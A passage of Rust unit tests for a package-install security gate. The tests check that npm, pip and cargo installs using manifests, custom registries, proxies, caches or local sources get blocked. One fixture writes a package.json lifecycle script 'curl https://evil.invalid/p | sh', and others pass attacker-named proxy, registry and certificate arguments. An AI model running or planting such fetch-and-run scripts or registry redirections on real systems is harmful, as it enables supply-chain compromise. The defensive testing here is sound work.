                plan.verdict.findings,
            );
        }
    }

    #[test]
    fn plan_install_detect_manifest_flag_recognizes_known_forms() {
        // Direct unit test on the detector.
        assert!(detect_manifest_flag(&[]).is_some());
        assert!(detect_manifest_flag(&["-r".to_string(), "req.txt".to_string()]).is_some());
        assert!(detect_manifest_flag(&["--requirement=r.txt".to_string()]).is_some());
        assert!(detect_manifest_flag(&["-e".to_string(), ".".to_string()]).is_some());
        assert!(detect_manifest_flag(&[".".to_string()]).is_some());
        assert!(detect_manifest_flag(&["./foo".to_string()]).is_some());
        assert!(detect_manifest_flag(&["--path".to_string(), ".".to_string()]).is_some());
        // Normal package names are NOT manifest references.
        assert!(detect_manifest_flag(&["requests".to_string()]).is_none());
        assert!(
            detect_manifest_flag(&["left-pad".to_string(), "--save-dev".to_string()]).is_none(),
            "a package name plus an npm flag must not be a manifest install"
        );
    }

    #[test]
    fn mixed_pip_package_and_manifest_is_never_partially_allowed() {
        let policy = Policy {
            fail_mode: FailMode::Closed,
            ..Policy::default()
        };
        let args = vec![
            "benign==1.0.0".to_string(),
            "-r".to_string(),
            "attacker.txt".to_string(),
        ];
        let plan = plan_install(&PlanRequest {
            manager: PackageManager::Pip,
            user_args: &args,
            db: None,
            policy: &policy,
            cwd: None,
            interactive: false,
            online: OnlineMode::Off,
        });
        assert_eq!(plan.verdict.action, Action::Block);
        assert_eq!(
            plan.packages.len(),
            1,
            "the explicit package is still scored"
        );
        assert!(plan.coverage.gaps.iter().any(|gap| {
            gap.kind == InstallCoverageGapKind::ManifestOrLocalSource
                && gap.argument.contains("attacker.txt")
        }));
    }

    #[test]
    fn joined_pip_manifest_and_npm_workspace_are_coverage_gaps() {
        let policy = Policy {
            fail_mode: FailMode::Closed,
            ..Policy::default()
        };
        for (manager, args) in [
            (PackageManager::Pip, vec!["-rattacker.txt".to_string()]),
            (PackageManager::Npm, vec!["--workspaces".to_string()]),
        ] {
            let plan = plan_install(&PlanRequest {
                manager,
                user_args: &args,
                db: None,
                policy: &policy,
                cwd: None,
                interactive: false,
                online: OnlineMode::Off,
            });
            assert_eq!(plan.verdict.action, Action::Block, "args={args:?}");
            assert_eq!(plan.coverage.state, InstallCoverageState::Incomplete);
        }
    }

    #[test]
    fn alternate_manager_config_inputs_are_unverified_sources() {
        for (manager, args) in [
            (
                PackageManager::Npm,
                vec![
                    "demo@1.0.0".to_string(),
                    "--userconfig".to_string(),
                    "attacker.npmrc".to_string(),
                ],
            ),
            (
                PackageManager::Cargo,
                vec![
                    "demo@=1.0.0".to_string(),
                    "--config".to_string(),
                    "source.crates-io.replace-with='attacker'".to_string(),
                ],
            ),
        ] {
            let plan = plan_install(&PlanRequest {
                manager,
                user_args: &args,
                db: None,
                policy: &empty_policy(),
                cwd: None,
                interactive: false,
                online: OnlineMode::Off,
            });
            assert_eq!(plan.verdict.action, Action::Block, "args={args:?}");
            assert!(plan
                .coverage
                .gaps
                .iter()
                .any(|gap| gap.kind == InstallCoverageGapKind::UnverifiedRegistry));
        }
    }

    #[test]
    fn structured_argv_keeps_cargo_path_with_spaces_as_one_local_operand() {
        let policy = Policy {
            fail_mode: FailMode::Closed,
            ..Policy::default()
        };
        let args = vec!["--path".to_string(), "./evil crate".to_string()];
        let plan = plan_install(&PlanRequest {
            manager: PackageManager::Cargo,
            user_args: &args,
            db: None,
            policy: &policy,
            cwd: None,
            interactive: false,
            online: OnlineMode::Off,
        });
        assert!(
            plan.packages.is_empty(),
            "path tail must not become a crate name"
        );
        assert!(plan.coverage.gaps.iter().any(|gap| {
            gap.kind == InstallCoverageGapKind::ManifestOrLocalSource
                && gap.argument == "--path ./evil crate"
        }));
        assert_eq!(plan.verdict.action, Action::Block);
    }

    #[test]
    fn custom_registry_never_reuses_official_provenance() {
        use std::sync::atomic::{AtomicUsize, Ordering};
        let calls = AtomicUsize::new(0);
        let resolver = |_eco: Ecosystem, _name: &str, _version: &str| {
            calls.fetch_add(1, Ordering::SeqCst);
            panic!("official resolver must not run for a custom source")
        };
        let policy = Policy {
            fail_mode: FailMode::Closed,
            ..Policy::default()
        };
        let args = vec![
            "trusted-name@1.0.0".to_string(),
            "--registry=https://attacker.invalid".to_string(),
        ];
        let plan = plan_install(&PlanRequest {
            manager: PackageManager::Npm,
            user_args: &args,
            db: None,
            policy: &policy,
            cwd: None,
            interactive: false,
            online: OnlineMode::Resolver {
                exact: &resolver,
                name_only: &existence_unknown,
            },
        });
        assert_eq!(calls.load(Ordering::SeqCst), 0);
        assert_eq!(plan.verdict.action, Action::Block);
        assert!(plan
            .coverage
            .gaps
            .iter()
            .any(|gap| gap.kind == InstallCoverageGapKind::UnverifiedRegistry));
    }

    #[test]
    fn ambient_unverified_registry_configuration_blocks() {
        let plan = plan_install(&PlanRequest {
            manager: PackageManager::Pip,
            user_args: &["trusted-name==1.0.0".to_string()],
            db: None,
            policy: &empty_policy(),
            cwd: None,
            interactive: false,
            online: OnlineMode::UnverifiedSource("PIP_INDEX_URL selects a private mirror"),
        });
        assert_eq!(plan.verdict.action, Action::Block);
        assert!(plan
            .coverage
            .gaps
            .iter()
            .any(|gap| gap.kind == InstallCoverageGapKind::UnverifiedRegistry));
    }

    #[test]
    fn online_unpinned_version_never_calls_exact_resolver() {
        use std::sync::atomic::{AtomicUsize, Ordering};
        let calls = AtomicUsize::new(0);
        let resolver = |_eco: Ecosystem, _name: &str, _version: &str| {
            calls.fetch_add(1, Ordering::SeqCst);
            ApiSignals::offline()
        };
        let plan = plan_install(&PlanRequest {
            manager: PackageManager::Npm,
            user_args: &["unresolved-package".to_string()],
            db: None,
            policy: &empty_policy(),
            cwd: None,
            interactive: false,
            online: OnlineMode::Resolver {
                exact: &resolver,
                name_only: &existence_unknown,
            },
        });
        assert_eq!(calls.load(Ordering::SeqCst), 0);
        assert_eq!(plan.verdict.action, Action::Warn);
        assert!(plan
            .coverage
            .gaps
            .iter()
            .any(|gap| gap.kind == InstallCoverageGapKind::UnresolvedVersion));
    }

    /// C13: an unpinned spec still gets a NAME-EXISTENCE answer. The exact
    /// resolver is never called (there is no version to bind), but a plausible
    /// name the registry does not have is now rejected instead of accepted.
    #[test]
    fn online_unpinned_nonexistent_name_is_rejected_without_the_exact_resolver() {
        use std::sync::atomic::{AtomicUsize, Ordering};
        let exact_calls = AtomicUsize::new(0);
        let name_calls = AtomicUsize::new(0);
        let resolver = |_eco: Ecosystem, _name: &str, _version: &str| {
            exact_calls.fetch_add(1, Ordering::SeqCst);
            ApiSignals::offline()
        };
        let name_only = |_eco: Ecosystem, _name: &str| {
            name_calls.fetch_add(1, Ordering::SeqCst);
            PackageExistence::NotFound
        };
        let policy = Policy {
            package_policy: crate::policy::PackagePolicy {
                block_not_found: true,
                ..Default::default()
            },
            ..Policy::default()
        };
        let plan = plan_install(&PlanRequest {
            manager: PackageManager::Npm,
            user_args: &["ghost-package".to_string()],
            db: None,
            policy: &policy,
            cwd: None,
            interactive: false,
            online: OnlineMode::Resolver {
                exact: &resolver,
                name_only: &name_only,
            },
        });
        assert_eq!(
            exact_calls.load(Ordering::SeqCst),
            0,
            "an unpinned spec must never acquire version-bound provenance"
        );
        assert_eq!(name_calls.load(Ordering::SeqCst), 1);
        assert!(
            plan.verdict
                .findings
                .iter()
                .any(|finding| finding.rule_id == RuleId::PackagePolicyNotFound),
            "a nonexistent name is rejected even when the install is unpinned: {:?}",
            plan.verdict.findings
        );
        // Existence is not resolution: the unresolved-version gap stays.
        assert!(plan
            .coverage
            .gaps
            .iter()
            .any(|gap| gap.kind == InstallCoverageGapKind::UnresolvedVersion));
    }

    /// The complement: an unpinned spec whose name DOES exist is unchanged from
    /// the pre-C13 behavior, so the probe adds a rejection and nothing else.
    #[test]
    fn online_unpinned_existing_name_keeps_the_unresolved_version_gap_only() {
        let resolver = |_eco: Ecosystem, _name: &str, _version: &str| ApiSignals::offline();
        let name_only = |_eco: Ecosystem, _name: &str| PackageExistence::Exists;
        let policy = Policy {
            package_policy: crate::policy::PackagePolicy {
                block_not_found: true,
                ..Default::default()
            },
            ..Policy::default()
        };
        let plan = plan_install(&PlanRequest {
            manager: PackageManager::Npm,
            user_args: &["real-package".to_string()],
            db: None,
            policy: &policy,
            cwd: None,
            interactive: false,
            online: OnlineMode::Resolver {
                exact: &resolver,
                name_only: &name_only,
            },
        });
        assert!(
            !plan
                .verdict
                .findings
                .iter()
                .any(|finding| finding.rule_id == RuleId::PackagePolicyNotFound),
            "an existing name is not rejected"
        );
        assert!(plan
            .coverage
            .gaps
            .iter()
            .any(|gap| gap.kind == InstallCoverageGapKind::UnresolvedVersion));
    }

    #[test]
    fn mismatched_exact_provenance_is_rejected() {
        let resolver = |_eco: Ecosystem, name: &str, _version: &str| ApiSignals::Available {
            provenance: ApiProvenance {
                source: "npm".to_string(),
                package_name: Some(name.to_string()),
                latest_version: Some("2.0.0".to_string()),
                package_existence: PackageExistence::Exists,
                ..Default::default()
            },
        };
        let plan = plan_install(&PlanRequest {
            manager: PackageManager::Npm,
            user_args: &["demo@1.0.0".to_string()],
            db: None,
            policy: &empty_policy(),
            cwd: None,
            interactive: false,
            online: OnlineMode::Resolver {
                exact: &resolver,
                name_only: &existence_unknown,
            },
        });
        assert_eq!(plan.verdict.action, Action::Block);
        assert!(plan
            .coverage
            .gaps
            .iter()
            .any(|gap| gap.kind == InstallCoverageGapKind::ProvenanceMismatch));
    }

    #[test]
    fn wrong_package_same_version_provenance_is_rejected() {
        let resolver = |_eco: Ecosystem, _name: &str, version: &str| ApiSignals::Available {
            provenance: ApiProvenance {
                source: "npm".to_string(),
                package_name: Some("different-package".to_string()),
                latest_version: Some(version.to_string()),
                package_existence: PackageExistence::Exists,
                ..Default::default()
            },
        };
        let plan = plan_install(&PlanRequest {
            manager: PackageManager::Npm,
            user_args: &["requested-package@1.0.0".to_string()],
            db: None,
            policy: &empty_policy(),
            cwd: None,
            interactive: false,
            online: OnlineMode::Resolver {
                exact: &resolver,
                name_only: &existence_unknown,
            },
        });
        assert_eq!(plan.verdict.action, Action::Block);
        assert!(plan
            .coverage
            .gaps
            .iter()
            .any(|gap| gap.kind == InstallCoverageGapKind::ProvenanceMismatch));
    }

    #[test]
    fn strict_exact_not_found_preserves_signal_but_blocks_missing_provenance() {
        let resolver = |_eco: Ecosystem, name: &str, _version: &str| ApiSignals::Available {
            provenance: ApiProvenance {
                source: "npm".to_string(),
                package_name: Some(name.to_string()),
                package_existence: PackageExistence::NotFound,
                ..Default::default()
            },
        };
        let mut policy = Policy {
            fail_mode: FailMode::Closed,
            ..Policy::default()
        };
        policy.package_policy.block_not_found = false;
        let plan = plan_install(&PlanRequest {
            manager: PackageManager::Npm,
            user_args: &["missing-package@1.0.0".to_string()],
            db: None,
            policy: &policy,
            cwd: None,
            interactive: false,
            online: OnlineMode::Resolver {
                exact: &resolver,
                name_only: &existence_unknown,
            },
        });
        assert_eq!(plan.verdict.action, Action::Block);
        assert!(plan
            .coverage
            .gaps
            .iter()
            .any(|gap| gap.kind == InstallCoverageGapKind::ProvenanceUnavailable));
        assert!(matches!(
            &plan.packages[0].risk.api_signals,
            ApiSignals::Available { provenance }
                if provenance.package_existence == PackageExistence::NotFound
        ));
        assert!(!plan
            .verdict
            .findings
            .iter()
            .any(|finding| finding.rule_id == RuleId::PackagePolicyNotFound));
    }

    #[test]
    fn exact_selected_npm_script_drives_install_policy_end_to_end() {
        let resolver = |_eco: Ecosystem, name: &str, version: &str| ApiSignals::Available {
            provenance: ApiProvenance {
                source: "npm".to_string(),
                package_name: Some(name.to_string()),
                latest_version: Some(version.to_string()),
                package_existence: PackageExistence::Exists,
                install_script_signals: Some(crate::package_risk::InstallScriptSignals {
                    has_network_call: true,
                    has_shell_spawn: true,
                    suspicious_patterns: vec!["curl".to_string()],
                }),
                ..Default::default()
            },
        };
        let mut policy = empty_policy();
        policy
            .package_policy
            .block_install_scripts_for_unknown_packages = true;
        let plan = plan_install(&PlanRequest {
            manager: PackageManager::Npm,
            user_args: &["unknown-package@1.0.0".to_string()],
            db: None,
            policy: &policy,
            cwd: None,
            interactive: false,
            online: OnlineMode::Resolver {
                exact: &resolver,
                name_only: &existence_unknown,
            },
        });
        assert_eq!(plan.verdict.action, Action::Block);
        assert!(plan.verdict.findings.iter().any(|finding| {
            finding.rule_id == RuleId::PackagePolicyUnknownPackageWithInstallScripts
        }));
    }

    #[test]
    fn default_install_script_network_signal_warns_below_aggregate_threshold() {
        let resolver = |_eco: Ecosystem, name: &str, version: &str| ApiSignals::Available {
            provenance: ApiProvenance {
                source: "npm".to_string(),
                package_name: Some(name.to_string()),
                latest_version: Some(version.to_string()),
                package_existence: PackageExistence::Exists,
                install_script_signals: Some(crate::package_risk::InstallScriptSignals {
                    has_network_call: true,
                    has_shell_spawn: false,
                    suspicious_patterns: vec!["curl".to_string()],
                }),
                ..Default::default()
            },
        };
        let plan = plan_install(&PlanRequest {
            manager: PackageManager::Npm,
            user_args: &["otherwise-clean-unknown@1.0.0".to_string()],
            db: None,
            policy: &empty_policy(),
            cwd: None,
            interactive: false,
            online: OnlineMode::Resolver {
                exact: &resolver,
                name_only: &existence_unknown,
            },
        });
        assert!(plan.packages[0].risk.score < crate::policy::DEFAULT_WARN_AGGREGATE_SCORE);
        assert_eq!(plan.verdict.action, Action::Warn);
        assert!(plan.verdict.findings.iter().any(|finding| {
            finding.rule_id == RuleId::PackageInstallScriptNetworkCall
                && finding.severity == Severity::Medium
        }));
    }

    #[test]
    fn trusted_policy_can_disable_default_install_script_warning() {
        let resolver = |_eco: Ecosystem, name: &str, version: &str| ApiSignals::Available {
            provenance: ApiProvenance {
                source: "npm".to_string(),
                package_name: Some(name.to_string()),
                latest_version: Some(version.to_string()),
                package_existence: PackageExistence::Exists,
                install_script_signals: Some(crate::package_risk::InstallScriptSignals {
                    has_network_call: false,
                    has_shell_spawn: true,
                    suspicious_patterns: vec!["sh -c".to_string()],
                }),
                ..Default::default()
            },
        };
        let mut policy = empty_policy();
        policy.package_policy.warn_install_script_network_call = false;
        let plan = plan_install(&PlanRequest {
            manager: PackageManager::Npm,
            user_args: &["otherwise-clean-unknown@1.0.0".to_string()],
            db: None,
            policy: &policy,
            cwd: None,
            interactive: false,
            online: OnlineMode::Resolver {
                exact: &resolver,
                name_only: &existence_unknown,
            },
        });
        assert!(!plan
            .verdict
            .findings
            .iter()
            .any(|finding| { finding.rule_id == RuleId::PackageInstallScriptNetworkCall }));
    }

    #[test]
    fn npm_flags_only_install_is_an_implicit_manifest_gap() {
        let policy = Policy {
            fail_mode: FailMode::Closed,
            ..Policy::default()
        };
        for flag in ["--foreground-scripts", "--force", "--ignore-scripts", "-g"] {
            let plan = plan_install(&PlanRequest {
                manager: PackageManager::Npm,
                user_args: &[flag.to_string()],
                db: None,
                policy: &policy,
                cwd: None,
                interactive: false,
                online: OnlineMode::Off,
            });
            assert_eq!(plan.verdict.action, Action::Block, "flag={flag}");
            assert!(plan.coverage.gaps.iter().any(|gap| {
                gap.kind == InstallCoverageGapKind::ManifestOrLocalSource
                    && gap.argument == "(no package operand)"
            }));
        }
    }

    #[test]
    fn explicit_npm_package_does_not_hide_current_project_manifest_inputs() {
        use std::sync::atomic::{AtomicUsize, Ordering};

        let directory = tempfile::tempdir().unwrap();
        std::fs::write(
            directory.path().join("package.json"),
            r#"{
                "name": "current-project",
                "dependencies": {"attacker-controlled": "1.0.0"},
                "scripts": {"dependencies": "curl https://evil.invalid/p | sh"}
            }"#,
        )
        .unwrap();
        let calls = AtomicUsize::new(0);
        let resolver = |_eco: Ecosystem, _name: &str, _version: &str| {
            calls.fetch_add(1, Ordering::SeqCst);
            panic!("official provenance must not run for a manifest-augmented install")
        };
        let policy = Policy {
            fail_mode: FailMode::Closed,
            ..Policy::default()
        };
        let manifest_path = directory.path().join("package.json");
        let plan = plan_install(&PlanRequest {
            manager: PackageManager::Npm,
            user_args: &["demo@1.0.0".to_string(), "--package-lock=false".to_string()],
            db: None,
            policy: &policy,
            cwd: Some(directory.path().display().to_string()),
            interactive: false,
            online: OnlineMode::Resolver {
                exact: &resolver,
                name_only: &existence_unknown,
            },
        });
        assert_eq!(calls.load(Ordering::SeqCst), 0);
        assert_eq!(plan.verdict.action, Action::Block);
        assert!(plan.coverage.gaps.iter().any(|gap| {
            gap.kind == InstallCoverageGapKind::ManifestOrLocalSource
                && gap.argument == manifest_path.display().to_string()
                && gap.reason.contains("dependencies")
                && gap.reason.contains("install lifecycle scripts")
        }));

        let global = plan_install(&PlanRequest {
            manager: PackageManager::Npm,
            user_args: &["demo@1.0.0".to_string(), "--global".to_string()],
            db: None,
            policy: &empty_policy(),
            cwd: Some(directory.path().display().to_string()),
            interactive: false,
            online: OnlineMode::Off,
        });
        assert!(!global
            .coverage
            .gaps
            .iter()
            .any(|gap| gap.argument == manifest_path.display().to_string()));

        for flag in ["--global", "-g"] {
            let local = plan_install(&PlanRequest {
                manager: PackageManager::Npm,
                user_args: &[
                    "demo@1.0.0".to_string(),
                    flag.to_string(),
                    "false".to_string(),
                ],
                db: None,
                policy: &policy,
                cwd: Some(directory.path().display().to_string()),
                interactive: false,
                online: OnlineMode::Off,
            });
            assert_eq!(local.verdict.action, Action::Block, "flag={flag}");
            assert!(local
                .coverage
                .gaps
                .iter()
                .any(|gap| gap.argument == manifest_path.display().to_string()));
        }

        let oversized_dir = tempfile::tempdir().unwrap();
        std::fs::write(
            oversized_dir.path().join("package.json"),
            vec![b' '; MAX_NPM_PROJECT_MANIFEST_BYTES as usize + 1],
        )
        .unwrap();
        let oversized = plan_install(&PlanRequest {
            manager: PackageManager::Npm,
            user_args: &["demo@1.0.0".to_string()],
            db: None,
            policy: &policy,
            cwd: Some(oversized_dir.path().display().to_string()),
            interactive: false,
            online: OnlineMode::Off,
        });
        assert_eq!(oversized.verdict.action, Action::Block);
        assert!(oversized.coverage.gaps.iter().any(|gap| {
            gap.kind == InstallCoverageGapKind::ManifestOrLocalSource
                && gap.reason.contains("bounded")
        }));
    }

    #[test]
    #[cfg(unix)]
    fn public_npm_planner_refuses_symlink_and_fifo_project_manifests() {
        use std::os::unix::ffi::OsStrExt as _;
        use std::time::{Duration, Instant};

        let policy = Policy {
            fail_mode: FailMode::Closed,
            ..Policy::default()
        };
        let args = ["demo@1.0.0".to_string()];

        let symlink_directory = tempfile::tempdir().unwrap();
        let target = symlink_directory.path().join("target.json");
        std::fs::write(&target, r#"{"name":"apparently-clean"}"#).unwrap();
        let symlink_manifest = symlink_directory.path().join("package.json");
        std::os::unix::fs::symlink(&target, &symlink_manifest).unwrap();
        let symlink_plan = plan_install(&PlanRequest {
            manager: PackageManager::Npm,
            user_args: &args,
            db: None,
            policy: &policy,
            cwd: Some(symlink_directory.path().display().to_string()),
            interactive: false,
            online: OnlineMode::Off,
        });
        assert!(symlink_plan.coverage.gaps.iter().any(|gap| {
            gap.kind == InstallCoverageGapKind::ManifestOrLocalSource
                && gap.argument == symlink_manifest.display().to_string()
                && gap.reason.contains("not a regular file bounded")
        }));
        assert_eq!(symlink_plan.verdict.action, Action::Block);

        let fifo_directory = tempfile::tempdir().unwrap();
        let fifo_manifest = fifo_directory.path().join("package.json");
        let fifo_path = std::ffi::CString::new(fifo_manifest.as_os_str().as_bytes()).unwrap();
        assert_eq!(unsafe { libc::mkfifo(fifo_path.as_ptr(), 0o600) }, 0);
        let started = Instant::now();
        let fifo_plan = plan_install(&PlanRequest {
            manager: PackageManager::Npm,
            user_args: &args,
            db: None,
            policy: &policy,
            cwd: Some(fifo_directory.path().display().to_string()),
            interactive: false,
            online: OnlineMode::Off,
        });
        assert!(started.elapsed() < Duration::from_secs(2));
        assert!(fifo_plan.coverage.gaps.iter().any(|gap| {
            gap.kind == InstallCoverageGapKind::ManifestOrLocalSource
                && gap.argument == fifo_manifest.display().to_string()
                && gap.reason.contains("not a regular file bounded")
        }));
        assert_eq!(fifo_plan.verdict.action, Action::Block);
    }

    #[test]
    fn documented_pip_nested_local_project_path_is_not_registry_covered() {
        let policy = Policy {
            fail_mode: FailMode::Closed,
            ..Policy::default()
        };
        let plan = plan_install(&PlanRequest {
            manager: PackageManager::Pip,
            user_args: &["path/to/SomeProject".to_string()],
            db: None,
            policy: &policy,
            cwd: None,
            interactive: false,
            online: OnlineMode::Off,
        });
        assert_eq!(plan.verdict.action, Action::Block);
        assert!(plan.packages.is_empty());
        assert!(plan.coverage.gaps.iter().any(|gap| {
            gap.kind == InstallCoverageGapKind::ManifestOrLocalSource
                && gap.argument == "path/to/SomeProject"
        }));

        let archive = plan_install(&PlanRequest {
            manager: PackageManager::Pip,
            user_args: &["package.tgz".to_string()],
            db: None,
            policy: &policy,
            cwd: None,
            interactive: false,
            online: OnlineMode::Off,
        });
        assert_eq!(archive.verdict.action, Action::Block);
        assert!(archive.coverage.gaps.iter().any(|gap| {
            gap.kind == InstallCoverageGapKind::ManifestOrLocalSource
                && gap.argument == "package.tgz"
        }));

        for archive_name in [
            "package.TBZ",
            "package.txz",
            "package.tlz",
            "package.tar.lz",
            "package.tar.lzma",
        ] {
            let archive = plan_install(&PlanRequest {
                manager: PackageManager::Pip,
                user_args: &[archive_name.to_string()],
                db: None,
                policy: &policy,
                cwd: None,
                interactive: false,
                online: OnlineMode::Off,
            });
            assert_eq!(archive.verdict.action, Action::Block, "{archive_name}");
            assert!(archive.coverage.gaps.iter().any(|gap| {
                gap.kind == InstallCoverageGapKind::ManifestOrLocalSource
                    && gap.argument == archive_name
            }));
        }

        for local_reference in [
            "file:evil",
            "file:evil@payload",
            "demo @ file:evil",
            "Demo@FILE:../evil",
            "evil-1.0.tar.gz; python_version >= \"3\"",
            "evil-1.0.tar.gz[extra]",
            ".; python_version >= \"3\"",
        ] {
            let local = plan_install(&PlanRequest {
                manager: PackageManager::Pip,
                user_args: &[local_reference.to_string()],
                db: None,
                policy: &policy,
                cwd: None,
                interactive: false,
                online: OnlineMode::Off,
            });
            assert_eq!(local.verdict.action, Action::Block, "{local_reference}");
            assert!(local.coverage.gaps.iter().any(|gap| {
                gap.kind == InstallCoverageGapKind::ManifestOrLocalSource
                    && gap.argument == local_reference
            }));
        }
    }

    #[test]
    fn documented_npm_non_registry_specs_are_never_marked_complete() {
        let policy = Policy {
            fail_mode: FailMode::Closed,
            ..Policy::default()
        };
        for operand in [
            "package.tar.gz",
            "gist:11081aaa281",
            "@scope/foo@file:../foo",
        ] {
            let plan = plan_install(&PlanRequest {
                manager: PackageManager::Npm,
                user_args: &[operand.to_string()],
                db: None,
                policy: &policy,
                cwd: None,
                interactive: false,
                online: OnlineMode::Off,
            });
            assert_eq!(plan.verdict.action, Action::Block, "operand={operand}");
            assert_eq!(plan.coverage.state, InstallCoverageState::Incomplete);
            assert!(plan.coverage.gaps.iter().any(|gap| {
                matches!(
                    gap.kind,
                    InstallCoverageGapKind::ManifestOrLocalSource
                        | InstallCoverageGapKind::RemoteOrVcsSource
                ) && gap.argument == operand
            }));
        }
    }

    #[test]
    fn alternate_package_caches_are_explicit_source_gaps() {
        let policy = Policy {
            fail_mode: FailMode::Closed,
            ..Policy::default()
        };
        for (manager, args, expected_argument) in [
            (
                PackageManager::Npm,
                vec!["demo@1.0.0".to_string(), "--offline".to_string()],
                "--offline",
            ),
            (
                PackageManager::Npm,
                vec![
                    "demo@1.0.0".to_string(),
                    "--cache=/tmp/attacker-cache".to_string(),
                ],
                "--cache=/tmp/attacker-cache",
            ),
            (
                PackageManager::Pip,
                vec![
                    "demo==1.0.0".to_string(),
                    "--cache-dir=/tmp/attacker-cache".to_string(),
                ],
                "--cache-dir=/tmp/attacker-cache",
            ),
            (
                PackageManager::Pip,
                vec![
                    "demo==1.0.0".to_string(),
                    "--proxy=http://attacker.invalid:8080".to_string(),
                ],
                "--proxy=http://attacker.invalid:8080",
            ),
            (
                PackageManager::Pip,
                vec![
                    "demo==1.0.0".to_string(),
                    "--cert=attacker-ca.pem".to_string(),
                ],
                "--cert=attacker-ca.pem",
            ),
        ] {
            let plan = plan_install(&PlanRequest {
                manager,
                user_args: &args,
                db: None,
                policy: &policy,
                cwd: None,
                interactive: false,
                online: OnlineMode::Off,
            });
            assert_eq!(plan.verdict.action, Action::Block, "args={args:?}");
            assert!(plan.coverage.gaps.iter().any(|gap| {
                gap.kind == InstallCoverageGapKind::UnverifiedRegistry
                    && gap.argument == expected_argument
            }));
        }
    }

    #[test]
    fn npm_alternate_prefix_is_an_explicit_project_input_gap() {
        let policy = Policy {
            fail_mode: FailMode::Closed,
            ..Policy::default()
        };
        for args in [
            vec![
                "demo@1.0.0".to_string(),
                "--prefix".to_string(),
                "alternate".to_string(),
            ],
            vec!["demo@1.0.0".to_string(), "--prefix=alternate".to_string()],
        ] {
            let plan = plan_install(&PlanRequest {
                manager: PackageManager::Npm,
                user_args: &args,
                db: None,
                policy: &policy,
                cwd: None,
                interactive: false,
                online: OnlineMode::Off,
            });
            assert_eq!(plan.verdict.action, Action::Block, "args={args:?}");
            assert!(plan.coverage.gaps.iter().any(|gap| {
                gap.kind == InstallCoverageGapKind::ManifestOrLocalSource
                    && gap.argument.contains("--prefix")
            }));
        }
    }

    #[test]
    fn cargo_empty_output_path_is_not_treated_as_covered() {
        let plan = plan_install(&PlanRequest {
            manager: PackageManager::Cargo,
            user_args: &["demo@=1.0.0".to_string(), "--root=".to_string()],
            db: None,
            policy: &empty_policy(),
            cwd: None,
            interactive: false,
            online: OnlineMode::Off,
        });
        assert!(plan.coverage.gaps.iter().any(|gap| {
            gap.kind == InstallCoverageGapKind::MissingArgumentValue && gap.argument == "--root"
        }));
    }

    #[test]
    fn npm_package_lock_is_a_mixed_operand_coverage_gap() {
        let policy = Policy {
            fail_mode: FailMode::Closed,
            ..Policy::default()
        };
        for flag in [
            "--package-lock",
            "--package-lock=true",
            "--package-lock=FALSE",
            "--package-lock=False",
        ] {
            let plan = plan_install(&PlanRequest {
                manager: PackageManager::Npm,
                user_args: &["demo@1.0.0".to_string(), flag.to_string()],
                db: None,
                policy: &policy,
                cwd: None,
                interactive: false,
                online: OnlineMode::Off,
            });
            assert_eq!(plan.verdict.action, Action::Block, "flag={flag}");
            assert!(plan.coverage.gaps.iter().any(|gap| {
                gap.kind == InstallCoverageGapKind::ManifestOrLocalSource && gap.argument == flag
            }));
        }

        let disabled = plan_install(&PlanRequest {
            manager: PackageManager::Npm,
            user_args: &["demo@1.0.0".to_string(), "--package-lock=false".to_string()],
            db: None,
            policy: &empty_policy(),
            cwd: None,
            interactive: false,
            online: OnlineMode::Off,
        });
        assert_eq!(disabled.coverage.state, InstallCoverageState::Complete);

        for args in [
            vec![
                "demo@1.0.0".to_string(),
                "--no-package-lock".to_string(),
                "false".to_string(),
            ],
            vec![
                "demo@1.0.0".to_string(),
                "--no-package-lock=false".to_string(),
            ],
        ] {
            let enabled = plan_install(&PlanRequest {
                manager: PackageManager::Npm,
                user_args: &args,
                db: None,
                policy: &policy,
                cwd: None,
                interactive: false,
                online: OnlineMode::Off,
            });
            assert_eq!(enabled.verdict.action, Action::Block, "args={args:?}");
            assert!(enabled.coverage.gaps.iter().any(|gap| {
                gap.kind == InstallCoverageGapKind::ManifestOrLocalSource
                    && gap.argument.contains("no-package-lock")
            }));
        }
    }

    #[test]
    fn legitimate_npm_registry_specs_remain_covered() {
        for operand in [
            "react",
            "react@18.2.0",
            "react@latest",
            "react@^18.0.0",
            "@scope/pkg",
            "@scope/pkg@~1.2.0",
        ] {
            let plan = plan_install(&PlanRequest {
                manager: PackageManager::Npm,
                user_args: &[operand.to_string()],
                db: None,
                policy: &empty_policy(),
                cwd: None,
                interactive: false,
                online: OnlineMode::Off,
            });
            assert_eq!(
                plan.coverage.state,
                InstallCoverageState::Complete,
                "operand={operand}, gaps={:?}",
                plan.coverage.gaps
            );
            assert_eq!(plan.packages.len(), 1, "operand={operand}");
        }
    }

    #[test]
    fn unknown_manager_option_suppresses_official_provenance() {
        use std::sync::atomic::{AtomicUsize, Ordering};

        let calls = AtomicUsize::new(0);
        let resolver = |_eco: Ecosystem, _name: &str, _version: &str| {
            calls.fetch_add(1, Ordering::SeqCst);
            panic!("an incomplete manager grammar must not call the official resolver")
        };
        let plan = plan_install(&PlanRequest {
            manager: PackageManager::Npm,
            user_args: &[
                "demo@1.0.0".to_string(),
                "--future-source-option".to_string(),
            ],
            db: None,
            policy: &empty_policy(),
            cwd: None,
            interactive: false,
            online: OnlineMode::Resolver {
                exact: &resolver,
                name_only: &existence_unknown,
            },
        });
        assert_eq!(calls.load(Ordering::SeqCst), 0);
        assert!(plan
            .coverage
            .gaps
            .iter()
            .any(|gap| gap.kind == InstallCoverageGapKind::UnrecognizedArgument));
        assert!(matches!(
            &plan.packages[0].risk.api_signals,
            ApiSignals::Unavailable { .. }
        ));
    }

    #[test]
    fn strict_offline_registry_install_has_an_explicit_provenance_gap() {
        let policy = Policy {
            fail_mode: FailMode::Closed,
            ..Policy::default()
        };
        let plan = plan_install(&PlanRequest {
            manager: PackageManager::Npm,
            user_args: &["clean-package@1.0.0".to_string()],
            db: None,
            policy: &policy,
            cwd: None,
            interactive: false,
            online: OnlineMode::Off,
        });
        assert_eq!(plan.verdict.action, Action::Block);
        assert!(plan
            .coverage
            .gaps
            .iter()
            .any(|gap| { gap.kind == InstallCoverageGapKind::ProvenanceUnavailable }));
    }

    #[test]
    fn strict_incomplete_coverage_cannot_be_downgraded_by_rule_override() {
        let mut policy = Policy {
            fail_mode: FailMode::Closed,
            ..Policy::default()
        };
        policy
            .severity_overrides
            .insert("threat_suspicious_package".to_string(), Severity::Low);
        let plan = plan_install(&PlanRequest {
            manager: PackageManager::Pip,
            user_args: &[
                "demo==1.0.0".to_string(),
                "-r".to_string(),
                "attacker.txt".to_string(),
            ],
            db: None,
            policy: &policy,
